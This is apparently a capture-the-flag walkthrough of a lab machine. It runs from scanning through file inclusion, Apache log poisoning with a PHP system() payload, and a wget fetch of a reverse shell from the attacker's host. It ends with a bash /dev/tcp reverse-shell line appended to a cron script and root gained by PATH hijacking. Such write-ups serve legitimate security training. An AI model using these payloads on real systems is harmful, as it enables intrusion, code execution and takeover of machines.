#### 1. Scanning

```
nmap -Pn -A 10.10.240.217
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-05 09:04 EST
Nmap scan report for 10.10.240.217
Host is up (0.22s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.55 seconds
```                                                                              
There are only two open ports: 22 and 80



#### 2. Gobuster

```
gobuster dir -u 10.10.240.217 -w /usr/share/wordlists/dirb/common.txt -e php,txt,html  
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.240.217
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/02/05 09:04:55 Starting gobuster
===============================================================
http://10.10.240.217/.hta (Status: 403)
http://10.10.240.217/.htaccess (Status: 403)
http://10.10.240.217/.htpasswd (Status: 403)
http://10.10.240.217/flags (Status: 301)
http://10.10.240.217/images (Status: 301)
http://10.10.240.217/index.html (Status: 200)
http://10.10.240.217/layout (Status: 301)
http://10.10.240.217/pages (Status: 301)
http://10.10.240.217/server-status (Status: 403)
===============================================================
2021/02/05 09:07:03 Finished
===============================================================
```


#### 3. Enumeration of website

I checked all links and buttons, googled if "Wavefire" exploit exists, however nothing came up. One of listed directories `/flags`  which seemed interesting in the beginning, turned out to be a rabbit hole.

On the other side, I noticed a mail address `support@mafialive.thm` so thought about adding `mafialive.thm` to my `/etc/hosts` file and then accessing the address once again.

Apparently it worked and I got first flag.

Afterwards, I ran gobuster once again, however this time including `mafialive.thm`

```
gobuster dir -u http://mafialive.thm/   -w /usr/share/wordlists/dirb/common.txt -e php,txt,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://mafialive.thm/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2021/02/05 09:15:34 Starting gobuster
===============================================================
http://mafialive.thm/.hta (Status: 403)
http://mafialive.thm/.htaccess (Status: 403)
http://mafialive.thm/.htpasswd (Status: 403)
http://mafialive.thm/index.html (Status: 200)
http://mafialive.thm/robots.txt (Status: 200)
http://mafialive.thm/server-status (Status: 403)
===============================================================
2021/02/05 09:17:48 Finished
===============================================================
```                                                                    

It finds `/robots.txt` only and inside there is 

```
User-agent: *
Disallow: /test.php
```

So website I need to check is `mafialie.thm/test.php`



#### 4. LFI

Website is vulnerable to LFI and it took me a while and lots of tries to google correct solution.

- Once we click a button, it shows us:

`http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php`

- We can add `php://filter/convert.base64-encode/resource=` and the result of `/mrrobot.php` will be converted to base64:

`http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php`

which gives:

`PD9waHAgZWNobyAnQ29udHJvbCBpcyBhbiBpbGx1c2lvbic7ID8+Cg==`

- Next step is to read `test.php`  itself using same method:

`http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`

gives:

```
 CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg== 
 ```

which decoded into ascii 

```
echo "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==" | base64 --decode
```

gives us code of `test.php` and another flag:

```
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
        <?php

	    //FLAG: thm{explo1t1ng_lf1}

            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    if(isset($_GET["view"])){
	    if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{

		echo 'Sorry, Thats not allowed';
            }
	}
        ?>
    </div>
</body>

</html>
```


According to the code, our LFI command:

- must include  `/var/www/html/development_test`
- can't include `../..`  cause otherwise it will show error `Sorry, Thats not allowed`

So we can use `..//..` instead.



Website runs on apache2, so let's check if apache `access.log` is accessible:

`http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log`

It is.

In order to poison the logs, firstly, we intercept the request and update `User-Agent` with `<?php system($_GET['cmd']);`

so it looks like this:

```
GET /test.php HTTP/1.1
Host: mafialive.thm
User-Agent: Mozilla/5.0 <?php system($_GET['cmd']); ?> Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

```

Secondly, at the end of previous command with `/apache.log` we add `access.log&cmd=id` and send request to repeater

`view=/var/www/html/development_testing/.././.././../log/apache2/access.log&cmd=id`

to get:

```
HTTP/1.1 200 OK
Date: Fri, 05 Feb 2021 16:06:26 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1587
Connection: close
Content-Type: text/html; charset=UTF-8

	
<!DOCTYPE HTML>
<html>

<head>
    <title>INCLUDE</title>
    <h1>Test Page. Not to be Deployed</h1>
 
    </button></a> <a href="/test.php?view=/var/www/html/development_testing/mrrobot.php"><button id="secret">Here is a button</button></a><br>
"
10.6.46.150 - - [05/Feb/2021:21:35:40 +0530] "GET /test.php HTTP/1.1" 200 436 "-" "Mozilla/5.0 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 Gecko/20100101 Firefox/78.0"
    </div>
</body>

</html>
```

As you can see, we execute `id` and read username `www-data`



#### 5. Reverse shell

Knowing that we can execute commands, let's run reverse shell downloaded from our machine, so step by step:

- I run netcat `sudo nc -lvnp 4444`
- I run python server on my local machine `python3 -m http.server`
- I execute pentest monkey's reverse shell with my IP and PORT using Burp:

```
GET /test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log&cmd=wget http://10.6.46.150:8000/revshell.php HTTP/1.1
Host: mafialive.thm
User-Agent: Mozilla/5.0 <?php system($_GET['cmd']); ?> Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache
```

and I am logged as `www-data`



#### 6. Enumeration of machine

Once logged it, I read `user.txt` placed in `/home/archangel`


```
www-data@ubuntu:/var/www/html/development_testing$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
archangel
www-data@ubuntu:/home$ cd archangel	
cd archangel
www-data@ubuntu:/home/archangel$ ls -al
ls -al
total 44
drwxr-xr-x 6 archangel archangel 4096 Nov 20 15:22 .
drwxr-xr-x 3 root      root      4096 Nov 18 13:06 ..
-rw-r--r-- 1 archangel archangel  220 Nov 18 00:48 .bash_logout
-rw-r--r-- 1 archangel archangel 3771 Nov 18 00:48 .bashrc
drwx------ 2 archangel archangel 4096 Nov 18 13:08 .cache
drwxrwxr-x 3 archangel archangel 4096 Nov 18 11:20 .local
-rw-r--r-- 1 archangel archangel  807 Nov 18 00:48 .profile
-rw-rw-r-- 1 archangel archangel   66 Nov 18 11:20 .selected_editor
drwxr-xr-x 2 archangel archangel 4096 Nov 18 01:36 myfiles
drwxrwx--- 2 archangel archangel 4096 Nov 19 20:41 secret
-rw-r--r-- 1 archangel archangel   26 Nov 19 19:57 user.txt
www-data@ubuntu:/home/archangel$ cat user.txt
cat user.txt
thm{lf1_t0_rc3_1s_tr1cky}
www-data@ubuntu:/home/archangel$ 
```


#### 7. Escalate to archangel

Firstly, I checked if `www-data` has sudo rights, but unfortunattely not.

Secondly, I thought about finding any suid executables which could be read by `archangel`

```
www-data@ubuntu:/home/archangel$ find / -user archangel -type f 2>/dev/null | grep -v /proc
<-user archangel -type f 2>/dev/null | grep -v /proc
/opt/helloworld.sh
/home/archangel/.selected_editor
/home/archangel/.profile
/home/archangel/user.txt
/home/archangel/.bash_logout
/home/archangel/.bashrc
```

I noticed a script `helloworld.sh` which can be executed by `www-data`



Script runs every minute as `archangel`

```
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/1 *   * * *   archangel /opt/helloworld.sh
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

It writes "hello world" to helloworld.txt

```
www-data@ubuntu:/home/archangel$ cat /opt/helloworld.sh
cat /opt/helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
```

Another interesting fact is that it has full permissions:

```
ls -al /opt/helloworld.sh
-rwxrwxrwx 1 archangel archangel 66 Nov 20 10:35 /opt/helloworld.sh
```

so it is possible to append a reverse shell oneliner, open netcat in another window and get shell as `archangel`

I type

`echo 'bash -i >& /dev/tcp/10.6.46.150/4444 0>&1' >> /opt/helloworld.sh`

so finally script looks like this:

```
cat /opt/helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
bash -i >& /dev/tcp/10.6.46.150/4444 0>&1
```

after one minute I am logged in as `archangel`

```
sudo nc -lvnp 4444
[sudo] password for kali: 
listening on [any] 4444 ...
connect to [10.6.46.150] from (UNKNOWN) [10.10.223.30] 37578
bash: cannot set terminal process group (1316): Inappropriate ioctl for device
bash: no job control in this shell
archangel@ubuntu:~$ 
```


#### 8. Getting root

I get `user2.txt` flag which is in `/secret` directory

```
archangel@ubuntu:~$ cd secret/
cd secret/
archangel@ubuntu:~/secret$ ls
ls
backup
user2.txt
archangel@ubuntu:~/secret$ cat user2.txt
cat user2.txt
thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
archangel@ubuntu:~/secret$ 
```

and then try to read `backup` which is suid binary but an error shows up



When I typed strings I found  an interesting line:

`cp /home/user/archangel/myfiles/* /opt/backupfiles`

So it is possible to get shell with `cp` as in the end of processs script gives root, but script has to execute from `/home/user/archangel`

Here is my approach step by step:

- I create a new file named `cp` with `touch cp` and add `/bin/bash -p` inside

```
archangel@ubuntu:~/secret$ echo "/bin/bash -p" > cp
echo "/bin/bash -p" > cp
```
- make it executable:

```
archangel@ubuntu:~/secret$ chmod +x cp
chmod +x cp
```

- check location where this file executes with which

```
archangel@ubuntu:~/secret$ which cp
which cp
/bin/cp
```
- I add it to path and check once again

```
archangel@ubuntu:~/secret$ export PATH=$PWD:$PATH
export PATH=$PWD:$PATH
archangel@ubuntu:~/secret$ which cp
which cp
/home/archangel/secret/cp
```

- run the script and become root

```
archangel@ubuntu:~/secret$ ./backup 
./backup
whoami
root
cd /root/root.txt
/bin/bash: line 2: cd: /root/root.txt: Not a directory
cat /root/root.txt
thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
```





